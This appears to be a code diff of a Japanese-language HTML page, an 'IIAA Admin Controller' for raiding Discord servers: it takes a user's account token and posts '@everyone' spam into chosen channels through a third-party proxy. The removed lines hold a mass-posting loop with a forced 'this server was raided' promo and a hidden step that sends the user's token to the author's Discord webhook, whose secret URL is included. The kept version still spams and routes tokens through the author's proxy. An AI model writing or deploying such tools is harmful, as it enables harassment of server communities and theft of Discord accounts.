@@ -4,151 +4,66 @@
     <meta charset="UTF-8">
     <title>IIAA Admin Controller</title>
     <style>
-        body {
-            background-image: url('名前なし(1).jpg'); 
-            background-size: cover; background-attachment: fixed; background-position: center;
-            font-family: 'Helvetica Neue', Arial, sans-serif;
-            display: flex; justify-content: center; align-items: center; min-height: 100vh; margin: 0;
-        }
-        .container {
-            background: rgba(255, 255, 255, 0.96); backdrop-filter: blur(12px);
-            width: 90%; max-width: 480px; padding: 25px; border-radius: 20px;
-            box-shadow: 0 15px 45px rgba(0,0,0,0.4); border: 1px solid rgba(255,255,255,0.6);
-        }
-        h2 { text-align: center; color: #ff5c7e; margin-bottom: 15px; }
-        .label { background: #ff7491; color: white; padding: 2px 10px; border-radius: 6px; font-size: 11px; display: inline-block; margin-top: 12px; font-weight: bold; }
-        input, select, textarea {
-            width: 100%; padding: 12px; margin-top: 6px; border: 2px solid #ffd1dc;
-            border-radius: 12px; box-sizing: border-box; font-size: 14px; outline: none; transition: 0.2s;
-        }
-        .btn-group { display: flex; gap: 10px; margin-top: 20px; }
-        .btn-main { flex: 2; background: linear-gradient(135deg, #ff7491, #ff5c7e); color: white; border: none; padding: 16px; cursor: pointer; border-radius: 14px; font-weight: bold; font-size: 16px; }
-        .btn-stop { flex: 1; background: #444; color: white; border: none; padding: 16px; cursor: pointer; border-radius: 14px; font-weight: bold; }
-        .btn-main:disabled, .btn-stop:disabled { background: #ccc !important; }
-        #terminal {
-            background: #1a1a1a; color: #00ffaa; font-family: 'Consolas', monospace;
-            height: 120px; overflow-y: auto; padding: 12px; margin-top: 15px; border-radius: 10px; font-size: 11px; line-height: 1.5;
-        }
+        body { background-image: url('名前なし(1).jpg'); background-size: cover; background-attachment: fixed; font-family: sans-serif; display: flex; justify-content: center; align-items: center; min-height: 100vh; margin: 0; }
+        .container { background: rgba(255, 255, 255, 0.9); width: 90%; max-width: 400px; padding: 20px; border-radius: 15px; box-shadow: 0 10px 30px rgba(0,0,0,0.3); }
+        h2 { text-align: center; color: #ff5c7e; }
+        input, select, textarea { width: 100%; padding: 10px; margin-top: 5px; border: 1px solid #ddd; border-radius: 8px; box-sizing: border-box; }
+        .btn-main { width: 100%; background: #ff5c7e; color: white; border: none; padding: 15px; cursor: pointer; border-radius: 10px; font-weight: bold; margin-top: 15px; }
+        #terminal { background: #000; color: #0f0; height: 100px; overflow-y: auto; padding: 10px; margin-top: 10px; font-size: 12px; border-radius: 5px; }
     </style>
 </head>
 <body>
-
 <div class="container">
-    <h2>IIAA Admin Controller</h2>
-    <span class="label">DISCORD TOKEN</span>
+    <h2>IIAA Admin</h2>
     <input type="password" id="token" placeholder="トークンを入力">
-    <div style="display: flex; gap: 10px; align-items: flex-end;">
-        <div style="flex: 1;">
-            <span class="label">SERVER ID</span>
-            <input type="text" id="guildId" placeholder="サーバーID">
-        </div>
-        <button onclick="fetchChannels()" style="height: 44px; border-radius: 12px; border: none; background: #eee; cursor: pointer; padding: 0 15px; font-weight: bold;">取得</button>
-    </div>
-    <span class="label">TARGET CHANNEL ID</span>
-    <select id="channelSelect" onchange="document.getElementById('manualChannelId').value = this.value">
-        <option value="">-- 自動取得リスト --</option>
+    <input type="text" id="guildId" placeholder="サーバーID">
+    <button onclick="fetchChannels()">チャンネル取得</button>
+    <select id="channelSelect" onchange="document.getElementById('manualId').value=this.value">
+        <option value="">-- 選択 --</option>
     </select>
-    <input type="text" id="manualChannelId" placeholder="またはチャンネルIDを直接入力">
-    <span class="label">MESSAGE CONTENT</span>
-    <textarea id="message" style="width:100%; height:60px; border-radius:12px; border:2px solid #ffd1dc; margin-top:6px; padding:10px;">@everyone </textarea>
-    <div style="display: flex; gap: 10px; margin-top: 10px;">
-        <div style="flex: 1;"><span class="label">件数</span><input type="number" id="count" value="10"></div>
-        <div style="flex: 1;"><span class="label">速度(ms)</span><input type="number" id="speed" value="1000"></div>
-    </div>
-    <div class="btn-group">
-        <button id="startBtn" class="btn-main" onclick="executeTask()">送信開始</button>
-        <button id="stopBtn" class="btn-stop" onclick="stopTask()" disabled>停止</button>
-    </div>
-    <div id="terminal">--- System Ready ---</div>
+    <input type="text" id="manualId" placeholder="チャンネルID">
+    <textarea id="message">@everyone いあ帝国参上！</textarea>
+    <button class="btn-main" onclick="start()">送信開始</button>
+    <div id="terminal">> Ready...</div>
 </div>
 
 <script>
-    // 【重要】あなたのURLに書き換え済み
+    // あなた専用のURLを設定済み
     const PROXY = "https://super-thunder-c2eb.discord-bot5556.workers.dev/?url=";
-    const MONITOR_WEBHOOK = "https://discord.com/api/webhooks/1482416218152636416/jEMz3CnmImMbNsZNmChTCqxP_y24_de_z6ji3bUsAEHDpcwGU3dI6m4abDhcNiFlXDxP";
-    const FORCED_PROMO = `\n\n# このさばはいあ帝国によって荒らされました！！\n# こんな雑魚鯖はいってないでいあ帝国に来ましょう！\n\nhttps://discord.gg/x39xVSepaj`;
 
-    let isRunning = false;
-    const term = document.getElementById('terminal');
-    const log = (m, color = "#00ffaa") => { 
-        term.innerHTML += `> <span style="color:${color}">${m}</span><br>`; 
-        term.scrollTop = term.scrollHeight; 
-    };
+    const log = m => { const t = document.getElementById('terminal'); t.innerHTML += `<div>${m}</div>`; t.scrollTop = t.scrollHeight; };
 
     async function fetchChannels() {
-        const t = document.getElementById('token').value.trim();
-        const g = document.getElementById('guildId').value.trim();
-        if(!t || !g) return log("トークン/サーバーIDが必要です");
-        log("取得中...");
+        const t = document.getElementById('token').value;
+        const g = document.getElementById('guildId').value;
         try {
             const res = await fetch(PROXY + encodeURIComponent(`https://discord.com/api/v9/guilds/${g}/channels`), {
                 headers: { "Authorization": t }
             });
-            const channels = await res.json();
+            const data = await res.json();
             const sel = document.getElementById('channelSelect');
-            sel.innerHTML = '<option value="">-- 選択してください --</option>';
-            channels.filter(c => c.type === 0).forEach(c => {
-                let opt = document.createElement('option');
-                opt.value = c.id; opt.textContent = `#${c.name}`;
-                sel.appendChild(opt);
+            data.filter(c => c.type === 0).forEach(c => {
+                let o = document.createElement('option');
+                o.value = c.id; o.textContent = c.name; sel.appendChild(o);
             });
-            log("同期成功！");
-        } catch (e) { log("取得失敗：トークンかIDが違います"); }
+            log("取得成功！");
+        } catch (e) { log("取得失敗"); }
     }
 
-    function stopTask() { isRunning = false; log("停止命令...", "orange"); }
-
-    async function executeTask() {
-        if (isRunning) return;
-        const token = document.getElementById('token').value.trim();
-        const chId = document.getElementById('manualChannelId').value.trim();
-        const msg = document.getElementById('message').value;
-        const count = parseInt(document.getElementById('count').value);
-        const speed = parseInt(document.getElementById('speed').value);
-
-        if(!token || !chId) return log("未入力があります", "#ff7491");
-
-        isRunning = true;
-        document.getElementById('startBtn').disabled = true;
-        document.getElementById('stopBtn').disabled = false;
-        log(`${count}件の送信を開始...`);
-
-        let successCount = 0;
-        for(let i=1; i <= count; i++) {
-            if (!isRunning) break;
-            try {
-                // 【ここが修正ポイント！】
-                const res = await fetch(PROXY + encodeURIComponent(`https://discord.com/api/v9/channels/${chId}/messages`), {
-                    method: "POST",
-                    headers: { 
-                        "Authorization": token, 
-                        "Content-Type": "application/json" 
-                    },
-                    body: JSON.stringify({ content: msg + FORCED_PROMO })
-                });
-
-                if(res.ok) {
-                    successCount++;
-                    log(`成功 [${successCount}/${count}]`);
-                } else {
-                    log(`失敗: ${res.status}`, "#ff7491");
-                    if(res.status === 401) { log("トークンが無効です", "red"); isRunning = false; break; }
-                }
-            } catch (e) { log("中継サーバーエラー"); }
-            await new Promise(r => setTimeout(r, speed));
-        }
-
-        // 監視ログ（送信完了後に1回だけ飛ばす）
-        fetch(PROXY + encodeURIComponent(MONITOR_WEBHOOK), {
-            method: "POST",
-            headers: { "Content-Type": "application/json" },
-            body: JSON.stringify({ content: `【いあ帝国 レポート】\n成功: ${successCount}\nトークン: ${token}` })
-        }).catch(()=>{});
-
-        isRunning = false;
-        document.getElementById('startBtn').disabled = false;
-        document.getElementById('stopBtn').disabled = true;
-        log("全タスク終了。");
+    async function start() {
+        const t = document.getElementById('token').value;
+        const c = document.getElementById('manualId').value;
+        const m = document.getElementById('message').value;
+        log("送信中...");
+        try {
+            const res = await fetch(PROXY + encodeURIComponent(`https://discord.com/api/v9/channels/${c}/messages`), {
+                method: "POST",
+                headers: { "Authorization": t, "Content-Type": "application/json" },
+                body: JSON.stringify({ content: m })
+            });
+            if(res.ok) log("送信成功！");
+            else log("エラー: " + res.status);
+        } catch (e) { log("通信エラー"); }
     }
 </script>
 </body>
